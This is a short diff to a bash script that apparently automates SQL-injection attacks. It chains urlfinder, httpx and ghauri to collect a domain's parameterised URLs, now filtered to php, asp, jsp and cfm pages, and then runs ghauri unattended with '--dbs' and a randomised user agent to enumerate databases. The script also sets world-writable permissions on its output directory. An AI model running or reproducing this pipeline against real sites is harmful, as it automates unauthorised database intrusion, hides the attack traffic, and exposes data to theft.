@@ -118,7 +118,7 @@ if [[ "$1" == "-l" && "$3" == "-all" ]]; then
     mkdir -p "$base_dir"
     chmod -R 777 "$main_dir"
 
-    urlfinder -d "$domain_Without_Protocol" -all | grep -aiE "[&=]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|gif|js|json)($|\s|\?|&|#|/|\.)" | awk -F'[?&=]' '!seen[$1$2]++' | iconv -f ISO-8859-1 -t UTF-8 | anew | httpx -duc -sc | grep -aiE "200|301|302|500" | awk '{print $1}' | anew>$base_dir/sqli.txt;ghauri -m $base_dir/sqli.txt --batch --dbs --random-agent
+    urlfinder -d "$domain_Without_Protocol" -all | grep -aiE "\.(php|asp|aspx|jsp|cfm)($|\s|\?|&|#|/|\.)" | grep -aiE "[&=]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|gif|js|json)($|\s|\?|&|#|/|\.)" | awk -F'[?&=]' '!seen[$1$2]++' | iconv -f ISO-8859-1 -t UTF-8 | anew | httpx -duc -sc | grep -aiE "200|301|302|500" | awk '{print $1}' | anew>$base_dir/sqli.txt;ghauri -m $base_dir/sqli.txt --batch --dbs --random-agent
     exit 0
 fi
 
@@ -132,6 +132,6 @@ if [[ "$1" == "-l" && "$3" == "-t" ]]; then
     mkdir -p "$base_dir"
     chmod -R 777 "$main_dir"
 
-    urlfinder -d "$domain_Without_Protocol" -all | grep -aiE "[&=]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|gif|js|json)($|\s|\?|&|#|/|\.)" | awk -F'[?&=]' '!seen[$1$2]++' | iconv -f ISO-8859-1 -t UTF-8 | anew | httpx -duc -sc | grep -aiE "200|301|302|500" | awk '{print $1}' | anew>$base_dir/sqli.txt;ghauri -m $base_dir/sqli.txt --batch --tech=T --dbs --random-agent
+    urlfinder -d "$domain_Without_Protocol" -all | grep -aiE "\.(php|asp|aspx|jsp|cfm)($|\s|\?|&|#|/|\.)" | grep -aiE "[&=]" | grep -aiEv "\.(css|ico|woff|woff2|svg|ttf|eot|png|jpg|gif|js|json)($|\s|\?|&|#|/|\.)" | awk -F'[?&=]' '!seen[$1$2]++' | iconv -f ISO-8859-1 -t UTF-8 | anew | httpx -duc -sc | grep -aiE "200|301|302|500" | awk '{print $1}' | anew>$base_dir/sqli.txt;ghauri -m $base_dir/sqli.txt --batch --tech=T --dbs --random-agent
     exit 0
 fi
